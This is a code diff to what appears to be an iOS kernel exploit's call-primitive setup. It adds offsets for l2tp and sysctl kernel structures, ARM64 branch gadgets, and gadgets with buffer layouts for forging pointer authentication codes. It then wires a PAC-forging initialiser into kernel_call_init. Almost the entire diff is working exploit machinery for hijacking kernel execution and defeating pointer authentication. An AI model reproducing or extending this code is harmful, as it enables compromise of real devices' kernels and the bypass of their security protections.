@@ -2,6 +2,7 @@
 
 #include "kernel_memory.h"
 #include "tasks.h"
+#include "pac.h"
 
 #include <assert.h>
 #include <stdarg.h>
@@ -156,6 +157,30 @@ static uint32_t kernel_call_7v_internal(uint64_t function, size_t argument_count
 
 bool
 kernel_call_init() {
+	ADDRESS(paciza_pointer__l2tp_domain_module_start)       = getoffset(paciza_pointer__l2tp_domain_module_start);
+    ADDRESS(paciza_pointer__l2tp_domain_module_stop)        = getoffset(paciza_pointer__l2tp_domain_module_stop);
+    ADDRESS(l2tp_domain_inited)                             = getoffset(l2tp_domain_inited);
+    ADDRESS(sysctl__net_ppp_l2tp)                           = getoffset(sysctl__net_ppp_l2tp);
+    ADDRESS(sysctl_unregister_oid)                          = getoffset(sysctl_unregister_oid);
+    ADDRESS(mov_x0_x4__br_x5)                               = getoffset(mov_x0_x4__br_x5);
+    ADDRESS(mov_x9_x0__br_x1)                               = getoffset(mov_x9_x0__br_x1);
+    ADDRESS(mov_x10_x3__br_x6)                              = getoffset(mov_x10_x3__br_x6);
+    ADDRESS(kernel_forge_pacia_gadget)                      = getoffset(kernel_forge_pacia_gadget);
+    ADDRESS(kernel_forge_pacda_gadget)                      = getoffset(kernel_forge_pacda_gadget);
+
+    SIZE(kernel_forge_pacxa_gadget_buffer)                  = 0x110;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, first_access)  = 0xe8;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result)  = 0xf0;
+    OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result)  = 0xe8;
+
+    SIZE(sysctl_oid)                = 0x50;
+	OFFSET(sysctl_oid, oid_parent)  =  0x0;
+	OFFSET(sysctl_oid, oid_link)    =  0x8;
+	OFFSET(sysctl_oid, oid_kind)    = 0x14;
+	OFFSET(sysctl_oid, oid_handler) = 0x30;
+	OFFSET(sysctl_oid, oid_version) = 0x48;
+	OFFSET(sysctl_oid, oid_refcnt)  = 0x4c;
+
 	SIZE(IOExternalTrap)                                     = 24;
 	
 	OFFSET(IOExternalTrap, object)                           = 0;
@@ -207,9 +232,9 @@ kernel_call_init() {
 
 	free(vtable);
 
-	return true;
+	init_kernel_pacxa_forging();
 
-	return ok;
+	return true;
 }
 
 bool
